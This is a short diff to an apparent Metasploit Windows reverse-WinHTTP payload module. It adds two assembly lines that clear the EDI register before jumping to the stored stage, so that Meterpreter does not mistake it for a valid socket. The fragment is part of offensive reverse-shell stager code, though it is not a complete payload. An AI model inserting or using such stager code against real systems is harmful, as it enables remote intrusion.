@@ -371,6 +371,8 @@ module Payload::Windows::ReverseWinHttp
           pop eax                ; clear the temporary storage
 
         execute_stage:
+          xor edi, edi           ; clear EDI, so we don't mislead meterpreter into
+                                 ; thinking it has a valid socket to play with
           ret                    ; dive into the stored stage address
 
         got_server_uri:
